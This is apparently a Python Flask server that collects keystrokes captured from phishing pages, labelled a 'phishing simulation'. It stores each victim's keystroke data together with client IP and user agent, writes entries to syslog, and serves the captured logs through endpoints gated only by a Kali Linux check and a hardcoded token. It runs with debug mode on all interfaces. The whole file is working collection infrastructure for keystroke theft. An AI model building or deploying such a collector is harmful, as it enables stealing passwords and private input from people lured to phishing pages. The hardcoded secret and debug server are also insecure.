from flask import Flask, request, jsonify
import json
from datetime import datetime
import os
import subprocess
import platform

app = Flask(__name__)

# Directory for storing keyboard logs
LOG_DIR = "keyboard_logs"
os.makedirs(LOG_DIR, exist_ok=True)

def is_kali_linux():
    """Check if running on Kali Linux"""
    try:
        # Check for Kali release file
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                return 'kali' in content
        return False
    except:
        return False

@app.route('/log_keystrokes', methods=['POST'])
def log_keystrokes():
    """Endpoint to receive keyboard event data"""
    try:
        # Check if running on Kali Linux
        if not is_kali_linux():
            return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
        
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
        
        # Add server-side metadata
        data['server_timestamp'] = datetime.now().isoformat()
        data['client_ip'] = request.remote_addr
        data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
        
        # Get Kali system info
        data['kali_info'] = get_kali_system_info()
        
        # Generate filename
        session_id = data.get('session_id', 'unknown_session')
        safe_session_id = ''.join(c for c in session_id if c.isalnum() or c in '_-')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{LOG_DIR}/keystrokes_{safe_session_id}_{timestamp}.json"
        
        # Save to file
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"Keystrokes logged: {session_id} from {data['client_ip']} - {data.get('total_events', 0)} events")
        
        # Also log to system log if on Kali
        log_to_system_log(data)
        
        return jsonify({"status": "success", "message": "Keystrokes logged", "filename": filename})
    
    except Exception as e:
        print(f"Error logging keystrokes: {e}")
        return jsonify({"error": str(e)}), 500

def get_kali_system_info():
    """Get Kali Linux system information"""
    info = {
        'system': platform.system(),
        'platform': platform.platform(),
        'is_kali': is_kali_linux()
    }
    
    try:
        # Get Kali version
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if 'PRETTY_NAME' in line:
                        info['os_name'] = line.split('=')[1].strip().strip('"')
        
        # Get hostname
        info['hostname'] = subprocess.getoutput('hostname')
        
        # Get logged in user
        info['logged_in_user'] = subprocess.getoutput('whoami')
        
    except Exception as e:
        info['error'] = str(e)
    
    return info

def log_to_system_log(data):
    """Log to Kali system log"""
    try:
        session_id = data.get('session_id', 'unknown')
        total_events = data.get('total_events', 0)
        client_ip = data.get('client_ip', 'unknown_ip')
        
        log_message = f"Phishing Simulation: Session {session_id} from {client_ip} captured {total_events} keystrokes"
        
        # Log to syslog
        subprocess.run(['logger', '-t', 'phishing_sim', log_message])
        
        # Also log to custom log file
        with open('/var/log/phishing_simulation.log', 'a') as f:
            f.write(f"{datetime.now().isoformat()} - {log_message}\n")
            
    except Exception as e:
        print(f"Warning: Could not write to system log: {e}")

@app.route('/get_logs', methods=['GET'])
def get_logs():
    """Get list of stored logs (Kali only)"""
    if not is_kali_linux():
        return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
    
    logs = []
    try:
        for filename in sorted(os.listdir(LOG_DIR)):
            if filename.endswith('.json'):
                filepath = os.path.join(LOG_DIR, filename)
                file_stats = os.stat(filepath)
                logs.append({
                    'filename': filename,
                    'size': file_stats.st_size,
                    'modified': datetime.fromtimestamp(file_stats.st_mtime).isoformat()
                })
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
    return jsonify({"logs": logs, "total": len(logs)})

@app.route('/get_log/<filename>', methods=['GET'])
def get_log(filename):
    """Get specific log file contents (Kali only)"""
    if not is_kali_linux():
        return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
    
    try:
        # Security check - prevent directory traversal
        safe_filename = os.path.basename(filename)
        filepath = os.path.join(LOG_DIR, safe_filename)
        
        if not os.path.exists(filepath):
            return jsonify({"error": "Log file not found"}), 404
        
        with open(filepath, 'r') as f:
            log_data = json.load(f)
        
        return jsonify(log_data)
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    """Clear all logs (requires authentication, Kali only)"""
    if not is_kali_linux():
        return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
    
    try:
        # Simple authentication check (you should improve this)
        auth_token = request.headers.get('X-Auth-Token')
        if auth_token != 'kali_secure_token':  # Change this in production
            return jsonify({"error": "Unauthorized"}), 401
        
        # Clear log directory
        for filename in os.listdir(LOG_DIR):
            filepath = os.path.join(LOG_DIR, filename)
            if os.path.isfile(filepath):
                os.remove(filepath)
        
        print("All logs cleared")
        return jsonify({"status": "success", "message": "All logs cleared"})
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print(f"Server running on Kali: {is_kali_linux()}")
    print(f"Log directory: {os.path.abspath(LOG_DIR)}")
    app.run(host='0.0.0.0', port=8080, debug=True)